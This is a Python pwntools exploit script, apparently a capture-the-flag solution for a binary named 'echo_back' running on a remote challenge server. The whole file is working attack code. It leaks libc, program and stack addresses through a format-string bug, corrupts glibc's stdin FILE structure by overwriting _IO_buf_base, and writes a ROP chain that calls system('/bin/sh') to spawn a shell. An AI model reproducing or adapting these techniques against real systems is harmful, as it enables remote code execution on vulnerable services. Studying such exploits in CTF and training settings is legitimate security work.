#!/usr/bin/env python
#-*- coding:utf-8 -*-

# Author: I0gan
# Team  : D0g3

from pwn import *
#from LibcSearcher import LibcSearcher

#context.log_level='debug'
#context.terminal = ['konsole', '-x', 'bash', 'c']
#context.terminal = 'konsole'
#context(arch = 'i386', os = 'linux', log_level='debug')
context(arch = 'amd64', os = 'linux', log_level='debug')

exeFile  = "echo_back"
libFile  = "./libc.so.6"

remoteIp = "111.198.29.45"
remotePort = 54180

LOCAL = 0
LIBC  = 1

r   =  lambda x : io.recv(x)
ra  =  lambda   : io.recvall()
rl  =  lambda   : io.recvline(keepends = True)
ru  =  lambda x : io.recvuntil(x, drop = True)
sl  =  lambda x : io.sendline(x)
sa  =  lambda x, y : io.sendafter(x, y)
sla =  lambda x, y : io.sendlineafter(x, y)
ia  =  lambda : io.interactive()
c   =  lambda : io.close()
pd32  = lambda x : p32(x).decode() #python3 not surport str + bytes
pd64  = lambda x : p64(x).decode()
li    = lambda x : log.info(x)
db    = lambda   : gdb.attach(io)

#--------------------------Func-----------------------------
def eb(length, text):
	sl(text)

#--------------------------Exploit--------------------------
def exploit():

	# leaking libc base
	sla('>>', str(2))
	sla(':', str(7))
	p = '%19$p'
	sl(p)
	ru('0x')
	libc_start_main = int(r(12),16) - 240
	libc_base = libc_start_main - lib.sym['__libc_start_main']
	li('libc_base:' + hex(libc_base))
	sys_addr = libc_base + lib.sym['system']
	sh_addr  = libc_base + lib.search('/bin/sh').next()
	
	# leaking elf base
	sla('>>', str(2))
	sla(':', str(7))
	p = '%14$p'
	sl(p)
	ru('0x')
	elf_base = int(r(12),16) - 0xD30
	main_addr = elf_base + 0xC6C
	pop_rdi_ret = elf_base + 0xd93
	li('elf_base:' + hex(elf_base))

	#leaking main ret in stack
	sla('>>', str(2))
	sla(':', str(7))
	p = '%12$p'
	sl(p)
	ru('0x')
	main_ret = int(r(12),16) + 0x8

	
	#leaking IO_buf_base
	_IO_2_1_stdin_ = libc_base + lib.sym['_IO_2_1_stdin_']
	_IO_buf_base = _IO_2_1_stdin_ + 0x8 * 7
	li('_IO_buf_base' + hex(_IO_buf_base))
		
    #modify _IO_buf_base
	sla('>>', str(1))
	p = p64(_IO_buf_base)
	sl(p)
	sla('>>', str(2))
	sla(':', str(7))
	p = '%16$hhn'
	sl(p)

	#build payload to modify _IO_2_1_stdin struct
	p = p64(_IO_2_1_stdin_ + 0x83) * 3
	p += p64(main_ret) + p64(main_ret + 0x8 * 3)
	sla('>>', str(2))
	sa(':', p) #length:
	sl('')
	
	#call getchar() make fp->_IO_read_ptr == fp->_IO_read_end
	for i in range(0, len(p) - 1):
		sla('>>', str(2))
		sla(':', ',')
		sl(' ')
	
	#build rop chail
	sla('>>', str(2))
	p = p64(pop_rdi_ret) + p64(sh_addr) + p64(sys_addr)
	sla(':', p) #length:
	sl('')
	#db()

	#get shell
	sla('>>', str(3))

	

def finish():
	ia()
	c()

#--------------------------Main-----------------------------
if __name__ == '__main__':
	
	if LOCAL:
		exe = ELF(exeFile)
		#io = exe.process()
		if LIBC:
			lib = ELF(libFile)
			io = exe.process(env = {"LD_PRELOAD" : libFile})
	
	else:
		exe = ELF(exeFile)
		io = remote(remoteIp, remotePort)
		if LIBC:
			lib = ELF(libFile)
	
	exploit()
	finish()
    
